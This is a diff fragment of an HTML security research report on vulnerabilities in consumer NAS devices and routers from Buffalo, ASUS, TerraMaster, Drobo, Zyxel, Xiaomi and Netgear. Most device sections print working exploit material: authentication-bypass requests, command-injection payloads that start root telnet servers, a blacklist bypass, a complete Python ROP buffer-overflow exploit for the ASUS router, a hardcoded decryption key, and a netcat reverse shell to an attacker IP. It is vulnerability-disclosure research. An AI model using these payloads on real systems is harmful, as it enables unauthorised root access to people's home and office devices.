+												<span style="font-weight: 400;">✓</span>
+											</td>
+											<td style="width: 7.04607%; text-align: center; border: 1px solid #ddd;">
+											</td>
+											<td style="width: 11.5628%; text-align: center; border: 1px solid #ddd;">
+												<span style="font-weight: 400;">✓</span>
+											</td>
+											<td style="width: 10.8401%; text-align: center; border: 1px solid #ddd;">
+												<span style="font-weight: 400;">✓</span>
+											</td>
+											<td style="width: 12.4661%; text-align: center; border: 1px solid #ddd;">
+											</td>
+											<td style="width: 12.3758%; text-align: center; border: 1px solid #ddd;">
+												<span style="font-weight: 400;">✓</span>
+											</td>
+										</tr>
+										<tr>
+											<td style="width: 16.5312%; text-align: center; border: 1px solid #ddd;">
+												<b>Zyxel NSA325 v2</b>
+											</td>
+											<td style="width: 7.85908%; text-align: center; border: 1px solid #ddd;">
+											</td>
+											<td style="width: 9.66576%; text-align: center; border: 1px solid #ddd;">
+											</td>
+											<td style="width: 9.66576%; text-align: center; border: 1px solid #ddd;">
+												<span style="font-weight: 400;">✓</span>
+											</td>
+											<td style="width: 7.04607%; text-align: center; border: 1px solid #ddd;">
+											</td>
+											<td style="width: 11.5628%; text-align: center; border: 1px solid #ddd;">
+											</td>
+											<td style="width: 10.8401%; text-align: center; border: 1px solid #ddd;">
+											</td>
+											<td style="width: 12.4661%; text-align: center; border: 1px solid #ddd;">
+												<span style="font-weight: 400;">✓</span>
+											</td>
+											<td style="width: 12.3758%; text-align: center; border: 1px solid #ddd;">
+											</td>
+										</tr>
+										<tr>
+											<td style="width: 16.5312%; text-align: center; border: 1px solid #ddd;">
+												<b>TOTOLINK A3002RU<span style="font-weight: 400;"> V1</span></b>
+											</td>
+											<td style="width: 7.85908%; text-align: center; border: 1px solid #ddd;">
+											</td>
+											<td style="width: 9.66576%; text-align: center; border: 1px solid #ddd;">
+												<span style="font-weight: 400;">✓</span>
+											</td>
+											<td style="width: 9.66576%; text-align: center; border: 1px solid #ddd;">
+												<span style="font-weight: 400;">✓</span>
+											</td>
+											<td style="width: 7.04607%; text-align: center; border: 1px solid #ddd;">
+											</td>
+											<td style="width: 11.5628%; text-align: center; border: 1px solid #ddd;">
+												<span style="font-weight: 400;">✓</span>
+											</td>
+											<td style="width: 10.8401%; text-align: center; border: 1px solid #ddd;">
+												<span style="font-weight: 400;">✓</span>
+											</td>
+											<td style="width: 12.4661%; text-align: center; border: 1px solid #ddd;">
+												<span style="font-weight: 400;">✓</span>
+											</td>
+											<td style="width: 12.3758%; text-align: center; border: 1px solid #ddd;">
+											</td>
+										</tr>
+										<tr>
+											<td style="width: 16.5312%; text-align: center; border: 1px solid #ddd;">
+												<b>Asustor AS-602T</b>
+											</td>
+											<td style="width: 7.85908%; text-align: center; border: 1px solid #ddd;">
+											</td>
+											<td style="width: 9.66576%; text-align: center; border: 1px solid #ddd;">
+												<span style="font-weight: 400;">✓</span>
+											</td>
+											<td style="width: 9.66576%; text-align: center; border: 1px solid #ddd;">
+												<span style="font-weight: 400;">✓</span>
+											</td>
+											<td style="width: 7.04607%; text-align: center; border: 1px solid #ddd;">
+											</td>
+											<td style="width: 11.5628%; text-align: center; border: 1px solid #ddd;">
+											</td>
+											<td style="width: 10.8401%; text-align: center; border: 1px solid #ddd;">
+											</td>
+											<td style="width: 12.4661%; text-align: center; border: 1px solid #ddd;">
+											</td>
+											<td style="width: 12.3758%; text-align: center; border: 1px solid #ddd;">
+												<span style="font-weight: 400;">✓</span>
+											</td>
+										</tr>
+										<tr>
+											<td style="width: 16.5312%; text-align: center; border: 1px solid #ddd;">
+												<b>Seagate STCR3000101</b>
+											</td>
+											<td style="width: 7.85908%; text-align: center; border: 1px solid #ddd;">
+											</td>
+											<td style="width: 9.66576%; text-align: center; border: 1px solid #ddd;">
+												<span style="font-weight: 400;">✓</span>
+											</td>
+											<td style="width: 9.66576%; text-align: center; border: 1px solid #ddd;">
+											</td>
+											<td style="width: 7.04607%; text-align: center; border: 1px solid #ddd;">
+												<span style="font-weight: 400;">✓</span>
+											</td>
+											<td style="width: 11.5628%; text-align: center; border: 1px solid #ddd;">
+											</td>
+											<td style="width: 10.8401%; text-align: center; border: 1px solid #ddd;">
+											</td>
+											<td style="width: 12.4661%; text-align: center; border: 1px solid #ddd;">
+											</td>
+											<td style="width: 12.3758%; text-align: center; border: 1px solid #ddd;">
+												<span style="font-weight: 400;">✓</span>
+											</td>
+										</tr>
+										<tr>
+											<td style="width: 16.5312%; text-align: center; border: 1px solid #ddd;">
+												<b>QNAP TS-870</b>
+											</td>
+											<td style="width: 7.85908%; text-align: center; border: 1px solid #ddd;">
+											</td>
+											<td style="width: 9.66576%; text-align: center; border: 1px solid #ddd;">
+												<span style="font-weight: 400;">✓</span>
+											</td>
+											<td style="width: 9.66576%; text-align: center; border: 1px solid #ddd;">
+												<span style="font-weight: 400;">✓</span>
+											</td>
+											<td style="width: 7.04607%; text-align: center; border: 1px solid #ddd;">
+											</td>
+											<td style="width: 11.5628%; text-align: center; border: 1px solid #ddd;">
+											</td>
+											<td style="width: 10.8401%; text-align: center; border: 1px solid #ddd;">
+											</td>
+											<td style="width: 12.4661%; text-align: center; border: 1px solid #ddd;">
+												<span style="font-weight: 400;">✓</span>
+											</td>
+											<td style="width: 12.3758%; text-align: center; border: 1px solid #ddd;">
+												<span style="font-weight: 400;">✓</span>
+											</td>
+										</tr>
+										<tr>
+											<td style="width: 16.5312%; text-align: center; border: 1px solid #ddd;">
+												<b>Mi Router 3</b>
+											</td>
+											<td style="width: 7.85908%; text-align: center; border: 1px solid #ddd;">
+											</td>
+											<td style="width: 9.66576%; text-align: center; border: 1px solid #ddd;">
+												<span style="font-weight: 400;">✓</span>
+											</td>
+											<td style="width: 9.66576%; text-align: center; border: 1px solid #ddd;">
+												<span style="font-weight: 400;">✓</span>
+											</td>
+											<td style="width: 7.04607%; text-align: center; border: 1px solid #ddd;">
+											</td>
+											<td style="width: 11.5628%; text-align: center; border: 1px solid #ddd;">
+											</td>
+											<td style="width: 10.8401%; text-align: center; border: 1px solid #ddd;">
+											</td>
+											<td style="width: 12.4661%; text-align: center; border: 1px solid #ddd;">
+											</td>
+											<td style="width: 12.3758%; text-align: center; border: 1px solid #ddd;">
+											</td>
+										</tr>
+										<tr>
+											<td style="width: 16.5312%; text-align: center; border: 1px solid #ddd;">
+												<b>Lenovo ix4-300d</b>
+											</td>
+											<td style="width: 7.85908%; text-align: center; border: 1px solid #ddd;">
+											</td>
+											<td style="width: 9.66576%; text-align: center; border: 1px solid #ddd;">
+												<span style="font-weight: 400;">✓</span>
+											</td>
+											<td style="width: 9.66576%; text-align: center; border: 1px solid #ddd;">
+												<span style="font-weight: 400;">✓</span>
+											</td>
+											<td style="width: 7.04607%; text-align: center; border: 1px solid #ddd;">
+											</td>
+											<td style="width: 11.5628%; text-align: center; border: 1px solid #ddd;">
+											</td>
+											<td style="width: 10.8401%; text-align: center; border: 1px solid #ddd;">
+											</td>
+											<td style="width: 12.4661%; text-align: center; border: 1px solid #ddd;">
+												<span style="font-weight: 400;">✓</span>
+											</td>
+											<td style="width: 12.3758%; text-align: center; border: 1px solid #ddd;">
+												<span style="font-weight: 400;">✓</span>
+											</td>
+										</tr>
+									</tbody>
+								</table>
+								<p><span style="font-weight: 400;">* The issues we reported to Synology (Session
+										Fixation and the ability to Query Existence of Arbitrary Files) were included in
+										this table.</span></p>
+								<p><span style="font-weight: 400;">** Though the Drobo does not include a web
+										application by default, we include vulnerabilities that appear in its optional
+										web application here.</span></p>
+								<p>The following sections detail our targets, the security controls we encountered in a
+									portion of our devices, and how we defeated each security control.</p>
+								<p><strong>Buffalo TeraStation TS5600D1206</strong><br />
+									The Buffalo TeraStation TS5600D1206 is an enterprise-grade NAS that features a web
+									application where users manage the services running on their device. The TeraStation
+									was previously featured in ISE’s research and has been since been updated to its
+									latest firmware and included in SOHOpelessly Broken 2.0.</p>
+								<p>The TeraStation’s web application uses browser cookies as part of their
+									authentication workflow and a JSON-RPC API available at the /nasapi endpoint to
+									interact with the device. Whenever the user issues a request to an API endpoint, the
+									backend verifies that the request contains a cookie that has been associated with a
+									valid user and then verifies the user’s authorization. We discovered that changing
+									the HTTP Host request header to 127.0.0.1 or localhost (the IP address and name for
+									the loopback interface) bypasses authentication and authorization checks. As a
+									result, any user with network level access to this device can issue requests without
+									authentication.</p>
+								<p>A proof of concept request to activate the NAS’s find device feature, is shown in the
+									POST request below.</p>
+								<p><code>POST /nasapi/ HTTP/1.1<br />
+Host: 127.0.0.1<br />
+Content-Type: application/json<br />
+X-Requested-With: XMLHttpRequest<br />
+Content-Length: 76<br />
+Connection: close</code></p>
+								<p><code>{"jsonrpc":"2.0","method":”sound.find_location_device","id":"1536265876914"}</code>
+								</p>
+								<p>This vulnerability could be used to enable or disable services, or perform other
+									actions available through the web application.</p>
+								<p>In addition to this authentication bypass, we found an OS CMDi vulnerability in the
+									TerraStation’s user creation workflow.</p>
+								<p>User creation follows a two-step process where the username is first stored in a
+									database then retrieved and passed as an argument to the pdbedit system command.
+									While this seems like a straightforward command injection vulnerability, we ran into
+									a complication (blacklist) that prohibits usernames to contain certain special
+									characters, i.e., (-_.!#&amp;@$*^%).</p>
+								<p>With knowledge that the command processor used on the TeraStation is Bash, we could
+									utilize built-in variables that can be used in place of the blacklisted characters.
+									Considering this, we used the following shell variables to build our final payload:
+								</p>
+								<p>$IFS is the <em>Internal Field Separator</em> and it can be used in place of the
+									space character.</p>
+								<p>$@ expands to <em>positional </em>parameters. In the case of our exploit, this
+									expands to nothing because we are not passing any parameters to the subshell.</p>
+								<p>$SHELL is the executing user’s preferred shell. In the case of the user launching
+									this process, the preferred shell is <em>/bin/bash.</em></p>
+								<p>With these variables, we can craft this payload depicted below.</p>
+								<p><code>ISEUserName$IFS&amp;telnetd$IFS-p$IFS$@8383$IFS-l$IFS$@$SHELL</code></p>
+								<p>Which evaluates to the figure below when processed by Bash.</p>
+								<p><code>ISEUserName &amp;telnetd -p 8383 -l /bin/bash</code></p>
+								<p>This payload will result in a user named ISEUserName being created and a telnet
+									server being spawned as the root user listening on port 8383.</p>
+								<p>The attacker can issue the following requests to first create the payload in the
+									database and then trigger the command injection.</p>
+								<p><code>POST /nasapi/ HTTP/1.1<br />
+Host: 127.0.0.1<br />
+Content-Type: application/json<br />
+X-Requested-With: XMLHttpRequest<br />
+Content-Length: 249<br />
+Connection: close</code></p>
+								<p><code>{"jsonrpc":"2.0","method":"User.create","params":{"name":"ISEUserName$IFS&amp;telnetd$IFS-p$IFS$@8383$IFS-l$IFS$@$SHELL","mail":"ise@ise.io","password":"test123","use_quota":0,"group_id":100,"sub_group_ids":[100]},"id":"1536180329935"}</code>
+								</p>
+								<p class="text-center">Request 1</p>
+								<p><code>POST /nasapi/ HTTP/1.1<br />
+Host: 127.0.0.1<br />
+Content-Length: 82<br />
+Content-Type: application/json<br />
+Connection: close</code></p>
+								<p><code>{"jsonrpc":"2.0","method":"apply_settings","params":{},"id":1529015375895"}</code>
+								</p>
+								<p class="text-center">Request 2</p>
+								<p>With the combination of an authentication bypass and a OS CMDi vulnerability, we
+									demonstrate how attackers can circumvent some of the security controls Buffalo
+									implemented on the TeraStation to obtain root privileges.</p>
+								<p><strong>ASUS RT-AC3200</strong><br />
+									The ASUS RT-AC3200 is a SOHO router that runs ASUS’s ASUSWRT firmware. ASUSWRT
+									provides a web server, known as httpd or milli_httpd, that provides users with
+									router management functionality.</p>
+								<p>ASUS provides the source code for many of the router’s programs, including for httpd,
+									under the terms of the GNU General Public License. While reviewing httpd’s source
+									code, we found frequent references to the following C macro:</p>
+								<p><code>#define websWrite(wp, fmt, args…) ({ int TMPVAR = fprintf(wp, fmt, ## args); fflush(wp); TMPVAR; })</code>
+								</p>
+								<p>This macro writes formatted data to a FILE pointer, which in this case is an HTTP
+									connection, using fprintf(). This introduces the possibility for an uncontrolled
+									format string vulnerability. C’s formatted print functions use specifiers such as %s
+									to indicate a string, %d for integers, and so on. An interesting specifier is %x,
+									which can be used to read bytes in hexadecimal format from the stack.</p>
+								<p>We used this format string vulnerability to bypass ASUSWRT’s address space layout
+									randomization (ASLR). In simple terms, ASLR randomizes the locations of segments in
+									memory between different runs of a program. As a result, it is difficult to exploit
+									buffer overflow vulnerabilities to achieve code execution as the addresses of
+									exploitable code are unpredictable. Fortunately, we were able to find an
+									uncontrolled format string vulnerability that allowed us to disclose pointers saved
+									on the call stack.</p>
+								<p>We then used the disclosed pointers in conjunction with a buffer overflow we found in
+									<code>/appGet.cgi</code> to gain remote code execution on the device. In the Python
+									script below, we use our format string vulnerability to disclose theses addresses
+									then leverage this information to bypass ASLR, and develop a buffer overflow exploit
+									that launches a shell using a combination of return oriented programming (ROP) and
+									the well-known return-to-libc technique.
+								</p>
+								<p><code><span style="font-weight: 400;">#!/usr/bin/env python</span></code></p>
+								<p><code><span style="font-weight: 400;"># Usage:<br />
+</span><span style="font-weight: 400;"># ./rt-ac3200_CVE-2018-14712.py &lt;target host&gt; &lt;target port&gt; &lt;admin username&gt; &lt;admin password&gt;</span></code>
+								</p>
+								<p><code><span style="font-weight: 400;">import base64<br />
+</span><span style="font-weight: 400;">import requests<br />
+</span><span style="font-weight: 400;">import struct<br />
+</span><span style="font-weight: 400;">import sys</span></code></p>
+								<p><code><span style="font-weight: 400;">gadget_offset = 0x23d0<br />
+</span><span style="font-weight: 400;">system_offset = 0x29f8<br />
+</span><span style="font-weight: 400;">cmd_offset = -0x2038</span></code></p>
+								<p><code><span style="font-weight: 400;">(host, port) = (sys.argv[1], sys.argv[2])<br />
+</span><span style="font-weight: 400;">url = ('http://%s:%s' % (host, port)) if port != '80' else 'http://%s' % host<br />
+</span><span style="font-weight: 400;">username = sys.argv[3]<br />
+</span><span style="font-weight: 400;">password = sys.argv[4]</span></code></p>
+								<p><code><span style="font-weight: 400;">s = requests.Session()</span></code></p>
+								<p><code><span style="font-weight: 400;">s.post(url + '/login.cgi',<br />
+</span><span style="font-weight: 400;">    headers={'Referer': url + '/Main_Login.asp'},<br />
+</span><span style="font-weight: 400;">    data={</span>'login_authorization': base64.b64encode(username + ':' + password)})</code>
+								</p>
+								<p><code>leak = s.get(url + '/appGet.cgi', params={</code><br />
+									<code>    'hook': 'nvram_match("wan_proto","dhcp","%p,%p,%p,%p,%p,")'</code><br />
+									<code>}).content</code>
+								</p>
+								<p><code>print(leak)</code></p>
+								<p><code>lib_base = int(leak.split(',')[4], 16)</code><br />
+									<code>stack_base = int(leak.split(',')[2], 16)</code>
+								</p>
+								<p><code>gadget = struct.pack('I', lib_base + gadget_offset)</code><br />
+									<code>system = struct.pack('I', lib_base + system_offset)</code><br />
+									<code>cmd = struct.pack('I', stack_base + cmd_offset)</code>
+								</p>
+								<p><code>if '\x00' in gadget or '\x00' in system or '\x00' in cmd:</code><br />
+									<code>    print('NULL byte detected: exploit will fail. Try again when server restarts.')</code>
+								</p>
+								<p><code>r = s.get(url + '/appGet.cgi', params={</code><br />
+									<code>    'hook': 'delete_sharedfolder()',</code><br />
+									<code>    'folder': 'A',</code><br />
+									<code>    'pool': 'A'*44 + gadget + cmd + 'A'*24 + system + 'telnetd -l /bin/sh -p 1234'</code><br />
+									<code>})</code>
+								</p>
+								<p><code>print(r.content)</code></p>
+								<p>Asus makes use of ASLR to guard against buffer-overflow attacks by randomizing the
+									location in memory where system executables are loaded. We were able to use a format
+									string vulnerability to circumvent this security control and effectively exploit a
+									stack based buffer overflow we discovered on the device.</p>
+								<p><strong>TerraMaster F2-420</strong><br />
+									The TerraMaster F2-420 is a NAS that allows users to manage files, install
+									additional applications, and administer the device. Its primary user interface is a
+									web application. This device has functionality to support multiple user accounts,
+									differentiating between standard users and administrators.</p>
+								<p>The authentication workflow provides users with a session token as a cookie after the
+									user supplies a correct username and password combination. After a user has a valid
+									session cookie they are able to navigate the Terramaster web application interface
+									to access the device’s functionality.</p>
+								<p>Although typical navigation of the web application verifies the user’s permissions
+									and authentication, some areas of the application and its API fail to enforce
+									authorization, and in some cases authentication. The lack of authentication on
+									certain API requests grants remote unauthenticated attackers the ability to bypass
+									front-end only access controls on the F2-420.</p>
+								<p>During our analysis of the F2-420 we needed to identify services that would grant us
+									the ability to gain root shell access. Although we could have mapped out the entire
+									application and <em>fuzzed</em> each input field with common command injection
+									payloads, we instead attempted to analyze each PHP file and determine which ones
+									shell-out with user provided input.</p>
+								<p>Instead of storing the PHP source files on the device as is common with PHP web
+									applications, TerraMaster encrypts the source files making them unreadable by
+									attackers with filesystem access in an attempt to hinder reverse engineering
+									efforts. This security control does not directly help protect users; rather, this is
+									a security control designed to protect TerraMaster’s application source code.</p>
+								<p><span style="font-weight: 400;">However, because the encrypted files must be
+										decrypted before they can be processed by the PHP interpreter, the decryption
+										key must be stored on the NAS. TerraMaster makes use of the </span><i><span
+											style="font-weight: 400;">screw_aes</span></i><span
+										style="font-weight: 400;"> library and the key to decrypt each source file is
+										hardcoded in the </span><i><span style="font-weight: 400;">php</span></i><span
+										style="font-weight: 400;"> binary on the device’s file system. We extracted this
+										key and decrypted each file manually with the following command</span></p>
+								<p><code>find . -name '*.php' -exec bash -c "openssl aes-256-cbc -d -K 3834326434326239383837366635383166306466626566623063643262356333 -iv 0 -in {} &gt; {}.dec.php " \;</code>
+								</p>
+								<p>With access to the application’s source code we can quickly search for dangerous
+									functions, find hidden application endpoints, and find authentication and
+									authorization logic. After reviewing the source code, we identified the
+									<code>/include/ajax/logtable.php</code> endpoint, which does not check requests for
+									authentication data. This endpoint interacts with a database using Linux system
+									commands called using PHP’s <code>system()</code> function. Attackers can use these
+									attributes to achieve unauthenticated root system command injection. A sample
+									payload is shown in the POST request below.
+								</p>
+								<p><code>POST /include/ajax/logtable.php HTTP/1.1</code><br />
+									<code>Host: NASIP:5443</code><br />
+									<code>Content-Type: application/x-www-form-urlencoded</code><br />
+									<code>Content-Length: 67</code>
+								</p>
+								<p><code>tab=gettotal&amp;Event=%60/usr/sbin/telnetd%20-l%20/bin/sh%20-p%208383%60&amp;table=access_syslog</code>
+								</p>
+								<p>This HTTP POST request causes the NAS to create a telnet server listening on port
+									8383. Attackers may connect to this telnet server without authentication and execute
+									arbitrary system commands.</p>
+								<p><span style="font-weight: 400;">Security controls on the Terramaster F2-420 are
+										easily bypassed by issuing requests directly to the device’s API. Through
+										reverse engineering, adversaries can circumvent security controls put in place
+										to protect TerraMaster’s PHP web application source code by extracting the
+										static key stored in the </span><i><span
+											style="font-weight: 400;">php</span></i><span style="font-weight: 400;">
+										binary and then decrypting each file manually.</span></p>
+								<p><strong>Drobo 5N2</strong><br />
+									The Drobo 5N2 is a NAS that allows users to install additional applications,
+									administer the device, host additional web applications and databases, and serve as
+									a network accessible storage device. The 5N2 is unique in comparison to the other
+									devices in this study as it does not feature any sort of web application by default.
+									Instead, the primary user interface is a desktop application for Windows and macOS
+									called Drobo Dashboard</p>
+								<p>Drobo Dashboard communicates with NASd, a custom service that runs on the 5N2 and
+									listens on TCP ports 5000 and 5001. NASd uses a custom protocol that attackers must
+									reverse engineer in order to communicate with the service. Fortunately, the protocol
+									can be understood after observing normal traffic between Drobo Dashboard and NASd.
+								</p>
+								<p>The NASd protocol uses the device’s serial number for authentication. While this is
+									ordinarily a poor form of authentication as the number can be found on the device
+									itself and possibly elsewhere, the device also provides its serial number to
+									anything that connects to port 5000, also known as the stat port. Connections made
+									to port 5001, the cmd port, must include the serial number. For an in-depth look at
+									the NASd protocol as well as a proof-of-concept program to interact with a Drobo
+									5N2, please refer to our Appendix.</p>
+								<p>With knowledge of the custom protocol, we can use NASd to install Drobo’s NAS
+									applications. These applications, including the web application DroboAccess, had a
+									number of vulnerabilities in them. DroboAccess has a command injection vulnerability
+									that allows unauthenticated attackers to execute arbitrary system commands with root
+									privileges. The following GET request shows a proof of concept request to start a
+									telnet server.</p>
+								<p><code>GET http://192.168.1.26:8080/DroboAccess/enable_user?username=test';/usr/sbin/telnetd%20-l/bin/sh&amp;enabled=true</code>
+								</p>
+								<p>The security of the NASd protocol relies exclusively on the protocol being obfuscated
+									and proprietary. Sufficiently skilled adversaries can reverse engineer proprietary
+									protocols, to then leverage the pervasive issue of missing authentication. After the
+									attacker has successfully exploited missing authentication measures, they can
+									install other applications. When we installed DroboAccess we discovered that there
+									were many authenticated pages that shelled out to the underlying OS to issue
+									commands that contain unsanitized user input granting us remote access with root
+									level permissions.</p>
+								<p><strong>Zyxel NSA325 v2</strong><br />
+									The Zyxel NSA325 v2 was previously exploited by ISE in earlier research projects.
+									After updating it to the latest firmware, we set out to determine whether the
+									NSA325’s security has improved over time.</p>
+								<p>The NSA325’s web application is distinctive for using two custom binaries,
+									<em>zysh</em> and <em>zyshclient</em>, the latter of which has a command-line
+									interface. Various requests to the web application's API result in
+									<em>zyshclient</em> being called with various parameters passed using a Unix pipe.
+									As a result, traditional command injection techniques cannot be used.
+								</p>
+								<p>Fortunately for security researchers, zyshclient may also be used interactively.
+									After enabling telnet and logging into the NAS, <em>zyshclient</em> can be started
+									resulting in a prompt similar to output shown below.</p>
+								<p><code>~ $ zyshclient</code><br />
+									<code>&gt;</code>
+								</p>
+								<p>Tab completion is functional, allowing us to obtain a list of zyshclient’s supported
+									functions by pressing the tab key.</p>
+								<p><code><span style="font-weight: 400;">~ $ zyshclient</span></code></p>
+								<p><code><span style="font-weight: 400;">&gt;</span></code></p>
+								<p><code><span style="font-weight: 400;">&lt;cr&gt;                          mrd</span></code>
+								</p>
+								<p><code><span style="font-weight: 400;">apply                         nfs</span></code>
+								</p>
+								<p><code><span style="font-weight: 400;">arp                           no</span></code>
+								</p>
+								<p><code><span style="font-weight: 400;">atse                          nslookup</span></code>
+								</p>
+								<p><code><span style="font-weight: 400;">aux                           package</span></code>
+								</p>
+								<p><code><span style="font-weight: 400;">backdoor                      packet-trace</span></code>
+								</p>
+								<p><code><span style="font-weight: 400;">browse                        ping</span></code>
+								</p>
+								<p><code><span style="font-weight: 400;">charDecoder                   pwron</span></code>
+								</p>
+								<p><code><span style="font-weight: 400;">clear                         reboot</span></code>
+								</p>
+								<p><code><span style="font-weight: 400;">configure                     release</span></code>
+								</p>
+								<p><code><span style="font-weight: 400;">connect_remote_share          rename</span></code>
+								</p>
+								<p><code><span style="font-weight: 400;">copy                          renew</span></code>
+								</p>
+								<p><code><span style="font-weight: 400;">debug                         rollback</span></code>
+								</p>
+								<p><code><span style="font-weight: 400;">delete                        run</span></code>
+								</p>
+								<p><code><span style="font-weight: 400;">dir                           show</span></code>
+								</p>
+								<p><code><span style="font-weight: 400;">disable                       show_remote_smb_shares</span></code>
+								</p>
+								<p><code><span style="font-weight: 400;">disconnect_remote_share       show_zysync_server_contents</span></code>
+								</p>
+								<p><code><span style="font-weight: 400;">domainami                     shutdown</span></code>
+								</p>
+								<p><code><span style="font-weight: 400;">dropbox                       storage</span></code>
+								</p>
+								<p><code><span style="font-weight: 400;">dservice                      tdc</span></code>
+								</p>
+								<p><code><span style="font-weight: 400;">enable                        test_connection</span></code>
+								</p>
+								<p><code><span style="font-weight: 400;">exit                          time_machine</span></code>
+								</p>
+								<p><code><span style="font-weight: 400;">fad                           traceroute</span></code>
+								</p>
+								<p><code><span style="font-weight: 400;">file                          ucopy</span></code>
+								</p>
+								<p><code><span style="font-weight: 400;">fileye                        user</span></code>
+								</p>
+								<p><code><span style="font-weight: 400;">gdrive                        uzync</span></code>
+								</p>
+								<p><code><span style="font-weight: 400;">import                        webdisk</span></code>
+								</p>
+								<p><code><span style="font-weight: 400;">interface                     whoami</span></code>
+								</p>
+								<p><code><span style="font-weight: 400;">ip                            wlan</span></code>
+								</p>
+								<p><code><span style="font-weight: 400;">ipcam                         write</span></code>
+								</p>
+								<p><code><span style="font-weight: 400;">job_controller                zy-pkgs</span></code>
+								</p>
+								<p><code><span style="font-weight: 400;">load                          zyfw</span></code>
+								</p>
+								<p><code><span style="font-weight: 400;">media</span></code></p>
+								<p>After testing these functions, we determined that package executes Linux system
+									commands. The output shown below contains the whoami command which indicates the
+									process is executed as root.</p>
+								<p><code>&gt; package whoami</code><br />
+									<code>root</code><br />
+									<code>retval = -1</code><br />
+									<code>ERROR: Parse error/command not found!</code>
+								</p>
+								<p>We can now use the package command to exploit OS CMDi. Next we have to:</p>
+								<ul>
+									<li>Identify a web API request that calls zyshclient</li>
+									<li>Terminate the zyshclient command</li>
+									<li>Inject a command using the package function</li>
+								</ul>
+								<p>The POST request below shows an HTTP request that fufills these requirements and
+									spawns a telnet server on port 8383.</p>
+								<p><code>POST /cmd,/ck6fup6/fileBrowser_main/browse HTTP/1.1</code><br />
+									<code>Host: 192.168.1.86</code><br />
+									<code>User-Agent: Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0</code><br />
+									<code>Content-Type: application/x-www-form-urlencoded; charset=UTF-8</code><br />
+									<code>Content-Length: 55</code><br />
+									<code>Cookie: language=en; ys-showedHomeBtnTooltip=b%3A1; ys-showedViewBtnTooltip=b%3A1; target=admin; authtok=572bvNtoFMUOot7PmFjGMNEfA61rZi3zntTm+KOnp9GXMicP6oUYt4AYcYfFbeME; ys-video_autoResume=b%3A1; ys-warnInstallPlayer=s%3Ayes; ys-warnVersionPlayer=s%3Ayes; ys-playerVolume=s%3A100</code>
+								</p>
+								<p><code>share=admin&amp;path=%2Fdownload"+%3b+package+telnetd+-l+/bin/sh+-p+8383+%3b+dir+"/&amp;start=0&amp;limit=26&amp;view=grid</code>
+								</p>
+								<p>An unencoded form of the payload sent in the path parameter is shown below.</p>
+								<p><code>/download" ; package telnetd -l /bin/sh -p 8383 ; dir "/</code></p>
+								<p>This request is also vulnerable to CSRF attacks, where an attacker can trick an
+									authenticated user into issuing this request. All the attacker needs to do is wait
+									for the user to visit a malicious page that issues this request cross-origin and
+									send the user’s cookies along.</p>
+								<p>While the use of Unix pipes serves as a security control that prevents traditional
+									command injection, user input is sent to a service that evaluates arbitrary commands
+									on the device’s underlying operating system shell. Chaining our OS CMDi exploit
+									along with CSRF we are able to remotely compromise our target with little user
+									interaction.</p>
+								<p><strong>Xiaomi Mi Router 3</strong><br />
+									Xiaomi is a popular brand from China that offers the Mi Router 3, a SOHO router.
+									Administrative functionality is implemented in Lua and follows an
+									Model-View-Controller (MVC) like architecture. While assessing this device, we first
+									analyzed how requests are routed then accessed each implemented route for
+									vulnerabilities.</p>
+								<p>Following these methods we discovered, in <code>luci/controller/api/misns.lua</code>,
+									that the URL endpoint <code>/cgi-bin/luci/;stok=/api/misns/wifi_access</code> makes
+									use of GET URL parameters that are passed as the arguments to a shell command. In
+									the figure below we illustrate the parameters used when issuing request to this
+									endpoint. In this request, is the user’s session token and is the MAC address to add
+									to wifi_access.</p>
+								<p><code>GET /cgi-bin/luci/;stok=/api/misns/wifi_access?mac=&amp;sns=&amp;grant=1&amp;guest_user_id=guid&amp;timeout=timeout</code>
+								</p>
+								<p>The controller for this request has a helper function for ensuring these parameters
+									are either nil, or do not contain a blacklisted set of shell metacharacters
+									characters that could be used to break out of the shell argument context. The
+									following characters are blacklisted by the Mi Router:</p>
+								<p><code>[`;|$&amp;{} ]</code></p>
+								<p>We were able to use newline characters (%0A) instead of semicolons and tabs (%09)
+									instead of spaces to bypass the character blacklist. Using these characters,
+									attackers can inject commands into the sns parameter. A sample GET request is shown
+									in below.</p>
+								<p><code>GET /cgi-bin/luci/;stok=88de3a3ba0e9a64f50124fbf669f088f/api/misns/wifi_access?mac=00:00:00:00:00:00&amp;sns='%0atouch%09/tmp/ise%0a%23&amp;grant=1&amp;guest_user_id=guid&amp;timeout=timeout HTTP/1.1</code>
+								</p>
+								<p>This character bypass shows how attackers could circumvent some of the security
+									controls Xiaomi placed on the device. In addition to the vulnerability discussed
+									above, this same endpoint is vulnerable to a command injection attack that is not
+									restricted by the character blacklist at all. Due to a bug in the web application’s
+									logic, the timeout parameter is never validated against the blacklist. This allows
+									attackers to use any command injection payload, regardless of character set. The GET
+									request below shows an example request that spawns a reverse shell that connects to
+									the attacker’s machine at 192.168.31.82 on port 9001.</p>
+								<p><code>GET /cgi-bin/luci/;stok=d714f92968bb8cc6466f87c8618dfc30/api/misns/wifi_access?mac=00:00:00:00:00:00&amp;sns=sns&amp;grant=1&amp;guest_user_id=guid&amp;timeout=’%3bmkfifo+/tmp/p%3bcat+/tmp/p|/bin/sh+-i+2&gt;%261|nc+192.168.31.82+9001+&gt;/tmp/p+%23 HTTP/1.1</code><br />
+									<code>Host: 192.168.31.1</code>
+								</p>
+								<p>We were able to circumvent Xiaomi’s security controls by first determining which
+									characters were blacklisted, listing other metacharacters accepted by the shell, and
+									finally substituting the blacklisted characters for others that are interpreted
+									equally. As noted above, we also found other endpoints with programming logic errors
+									that allowed us to circumvent the blacklist entirely.</p>
+								<p><strong>Netgear Nighthawk R9000</strong><br />
+									The NETGEAR Nighthawk X10 R9000 is a high-end flagship router, supporting a variety
+									of traffic management and administrative features. The primary user interface for
+									this device is a web application, but a SOAP-based mobile application is also
+									available. Within either interface, an administrator may manipulate common network
+									settings, view device logs, manage Quality of Service as well as various other
+									settings.</p>
+								<p>Initial testing of the administrative mobile application revealed that the
+									“<code>X-Forwarded-Fo</code>r” HTTP header is interpreted by the application. This
+									header is commonly used by load balancers to convey a client's IP address to
+									downstream services, but it can lead to unexpected issues if used improperly. This
+									device appears to interpret the header's contents as the client's real IP address,
+									overriding any previous values. This device also appears to whitelist requests from
+									its own IP address, allowing internal use of the API without managing
+									authentication. When combined, these two functionalities give an attacker the
+									ability to bypass all authentication checks on the SOAP API. This is due to the fact
+									that the X-Forwarded-For HTTP header is client-controlled, and the device is not
+									protected by any sort of load balancer or reverse proxy. Furthermore, the
+									X-Forwarded-For header is not a forbidden header. As such, it may be sent via XHR
+									requests in JavaScript.</p>
